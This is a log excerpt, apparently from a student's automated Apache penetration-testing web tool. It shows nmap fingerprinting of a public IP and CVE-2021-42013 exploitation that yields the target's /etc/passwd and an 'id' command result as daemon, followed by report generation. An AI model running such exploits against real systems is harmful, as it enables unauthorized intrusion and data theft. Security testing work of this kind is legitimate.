+SF:83c72df122fc6be5d47d1b\",\"build_snapshot\":false}")%r(HTTPOptions,B9,"
+SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nX-Cascade:\x20pass\r\nContent-Type:
+SF:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nContent-L
+SF:ength:\x2057\r\n\r\n{\"path\":\"/\",\"status\":404,\"error\":{\"message
+SF:\":\"Not\x20Found\"}}")%r(RTSPRequest,42A,"HTTP/1\.0\x20400\x20Bad\x20R
+SF:equest\r\nContent-Length:\x20989\r\n\r\nPuma\x20caught\x20this\x20error
+SF::\x20Invalid\x20HTTP\x20format,\x20parsing\x20fails\.\x20Are\x20you\x20
+SF:trying\x20to\x20open\x20an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x
+SF:20Puma\?\x20\(Puma::HttpParserError\)\norg/jruby/puma/Http11\.java:200:
+SF:in\x20`execute'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/gems/p
+SF:uma-6\.4\.2-java/lib/puma/client\.rb:268:in\x20`try_to_finish'\n/usr/sh
+SF:are/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/pum
+SF:a/server\.rb:298:in\x20`reactor_wakeup'\n/usr/share/logstash/vendor/bun
+SF:dle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/puma/server\.rb:248:in\x20
+SF:`block\x20in\x20run'\n/usr/share/logstash/vendor/bundle/jruby/3\.1\.0/g
+SF:ems/puma-6\.4\.2-java/lib/puma/reactor\.rb:119:in\x20`wakeup!'\n/usr/sh
+SF:are/logstash/vendor/bundle/jruby/3\.1\.0/gems/puma-6\.4\.2-java/lib/pum
+SF:a/reactor\.rb:76:in\x20`block\x20in\x20select_loop'\norg/nio4r/Selector
+SF:\.java:218:in\x20`select'\n/usr/share/logstash/vendor/bundle/jruby/3\.1
+SF:\.0/gems/puma-6\.4\.2-java/lib/puma/");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 346.57 seconds
+
+2024-07-07 21:09:58,597 INFO Found Apache ports: ['80', '889', '3790']
+2024-07-07 21:09:58,597 INFO Checking vulnerabilities on http://152.42.212.132:80
+2024-07-07 21:09:58,605 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 21:09:58,656 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 21:09:58,658 DEBUG Starting new HTTP connection (1): 152.42.212.132:80
+2024-07-07 21:09:58,702 DEBUG http://152.42.212.132:80 "HEAD / HTTP/11" 200 0
+2024-07-07 21:09:58,703 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-07 21:09:58,708 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 21:09:58,784 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 21:09:58,886 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-07 21:09:58,963 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-07 21:10:21,478 INFO Checking vulnerabilities on http://152.42.212.132:3790
+2024-07-07 21:10:21,481 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 21:10:21,558 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 21:10:21,567 DEBUG Starting new HTTP connection (1): 152.42.212.132:3790
+2024-07-07 21:10:21,632 DEBUG http://152.42.212.132:3790 "HEAD / HTTP/11" 301 0
+2024-07-07 21:10:21,636 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+http://152.42.212.132:889 is vulnerable to Remote Code Execution attack (CVE-2021-42013)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+[+] whoami:
+
+[+] ls:
+
+[+] pwd:
+
+[+] uname -a:
+
+
+2024-07-07 21:10:21,721 INFO Header added successfully.
+2024-07-07 21:10:21,742 INFO Cover page created successfully.
+2024-07-07 21:10:21,982 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-07 21:10:21,982 INFO Process completed in 640.9150538444519 seconds.
+2024-07-07 21:10:21,987 INFO 127.0.0.1 - - [07/Jul/2024 21:10:21] "POST /run_apache HTTP/1.1" 200 -
+2024-07-07 21:10:22,001 INFO 127.0.0.1 - - [07/Jul/2024 21:10:22] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-08 04:01:40,715 INFO 127.0.0.1 - - [08/Jul/2024 04:01:40] "GET /static/output/Penetration_Test_Report_Apache.docx HTTP/1.1" 200 -
+2024-07-08 04:41:24,583 INFO  * Detected change in 'D:\\tugas_akhir_final\\main.py', reloading
+2024-07-08 04:41:25,007 INFO  * Restarting with stat
+2024-07-08 04:41:28,358 WARNING  * Debugger is active!
+2024-07-08 04:41:28,383 INFO  * Debugger PIN: 860-226-893
+2024-07-08 04:41:28,478 INFO 127.0.0.1 - - [08/Jul/2024 04:41:28] "GET / HTTP/1.1" 200 -
+2024-07-08 04:41:28,621 INFO 127.0.0.1 - - [08/Jul/2024 04:41:28] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-08 04:41:31,055 INFO 127.0.0.1 - - [08/Jul/2024 04:41:31] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-08 04:41:31,141 INFO 127.0.0.1 - - [08/Jul/2024 04:41:31] "GET /apache_form HTTP/1.1" 200 -
+2024-07-08 04:41:31,172 INFO 127.0.0.1 - - [08/Jul/2024 04:41:31] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-08 04:41:34,457 INFO Running Apache exploit on 152.42.212.132: with vulnerability both
+2024-07-08 04:45:44,438 INFO Nmap scan result: 
+2024-07-08 04:45:44,438 INFO Filtered Apache scan result: 
+2024-07-08 04:45:44,438 INFO Found Apache ports: []
+2024-07-08 04:45:44,439 INFO Vulnerability findings: 
+2024-07-08 04:45:44,525 INFO Header added successfully.
+2024-07-08 04:45:44,536 INFO Cover page created successfully.
+2024-07-08 04:45:44,601 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-08 04:45:44,601 INFO Process completed in 250.14416909217834 seconds.
+2024-07-08 04:45:44,621 INFO 127.0.0.1 - - [08/Jul/2024 04:45:44] "POST /run_apache HTTP/1.1" 200 -
+2024-07-08 04:45:44,634 INFO 127.0.0.1 - - [08/Jul/2024 04:45:44] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-08 04:48:08,191 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-08 04:48:08,314 INFO  * Restarting with stat
+2024-07-08 04:48:10,312 WARNING  * Debugger is active!
+2024-07-08 04:48:10,319 INFO  * Debugger PIN: 860-226-893
+2024-07-08 04:48:40,715 INFO 127.0.0.1 - - [08/Jul/2024 04:48:40] "GET / HTTP/1.1" 200 -
+2024-07-08 04:48:40,832 INFO 127.0.0.1 - - [08/Jul/2024 04:48:40] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-08 04:48:44,255 INFO 127.0.0.1 - - [08/Jul/2024 04:48:44] "[32mPOST /select_tool HTTP/1.1[0m" 302 -
+2024-07-08 04:48:44,277 INFO 127.0.0.1 - - [08/Jul/2024 04:48:44] "GET /apache_form HTTP/1.1" 200 -
+2024-07-08 04:48:44,293 INFO 127.0.0.1 - - [08/Jul/2024 04:48:44] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-08 04:48:47,265 INFO Running Apache exploit on 152.42.212.132: with vulnerability pt
+2024-07-08 04:59:00,153 INFO  * Detected change in 'D:\\tugas_akhir_final\\apache\\scanner.py', reloading
+2024-07-08 04:59:00,253 INFO  * Restarting with stat
+2024-07-08 04:59:02,043 WARNING  * Debugger is active!
+2024-07-08 04:59:02,049 INFO  * Debugger PIN: 860-226-893
+2024-07-08 04:59:02,084 INFO Running Apache exploit on 152.42.212.132: with vulnerability pt
+2024-07-08 05:08:09,841 INFO Nmap scan result: 889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+2024-07-08 05:08:09,841 INFO Filtered Apache scan result: 889/tcp   open     http            Apache httpd 2.4.50 ((Unix))
+2024-07-08 05:08:09,845 INFO Found Apache ports: ['889']
+2024-07-08 05:08:09,845 INFO Checking vulnerabilities on http://152.42.212.132:889
+2024-07-08 05:08:09,862 DEBUG Starting new HTTP connection (1): 152.42.212.132:889
+2024-07-08 05:08:10,128 DEBUG http://152.42.212.132:889 "HEAD / HTTP/11" 200 0
+2024-07-08 05:08:10,346 INFO Vulnerability findings: http://152.42.212.132:889 is vulnerable to Path Traversal Attack (CVE-2021-42013)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+
+2024-07-08 05:08:10,450 INFO Header added successfully.
+2024-07-08 05:08:10,465 INFO Cover page created successfully.
+2024-07-08 05:08:10,580 INFO DOCX report saved at static\output\Penetration_Test_Report_Apache.docx
+2024-07-08 05:08:10,580 INFO Process completed in 548.4970092773438 seconds.
+2024-07-08 05:08:10,591 INFO 127.0.0.1 - - [08/Jul/2024 05:08:10] "POST /run_apache HTTP/1.1" 200 -
+2024-07-08 05:08:10,744 INFO 127.0.0.1 - - [08/Jul/2024 05:08:10] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
+2024-07-08 05:10:22,391 INFO 127.0.0.1 - - [08/Jul/2024 05:10:22] "GET /static/output/Penetration_Test_Report_Apache.docx HTTP/1.1" 200 -
+2024-07-08 05:11:14,287 INFO 127.0.0.1 - - [08/Jul/2024 05:11:14] "GET / HTTP/1.1" 200 -
+2024-07-08 05:11:14,337 INFO 127.0.0.1 - - [08/Jul/2024 05:11:14] "[36mGET /static/styles.css HTTP/1.1[0m" 304 -
